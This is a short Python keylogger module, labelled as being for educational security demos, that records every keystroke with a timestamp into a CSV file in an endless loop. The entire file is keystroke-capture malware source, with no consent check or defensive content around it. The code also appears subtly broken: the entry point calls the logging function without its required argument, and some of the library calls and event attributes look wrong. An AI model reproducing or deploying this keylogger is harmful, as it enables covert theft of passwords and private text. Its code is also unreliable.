"""Keylogger module for educational security demos."""

import time
import keyboard
import csv
import os
from datetime import datetime


def log_to_file(log_file: str) -> None:
    """
    Log keystrokes to a CSV file.

    Args:
        log_file: Path to the output CSV file.
    """
    log_file = log_file or "keylog.csv"

    with open(log_file, mode="a", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["timestamp", "key", "is_key_up", "is_key_down"])

        while True:
            for event in keyboard.read_events():
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")
                writer.writerow([timestamp, event.name, event.is_key_up, event.is_key_down])


if __name__ == "__main__":
    print("Keylogger running. Press Ctrl+C to stop.")
    log_to_file()
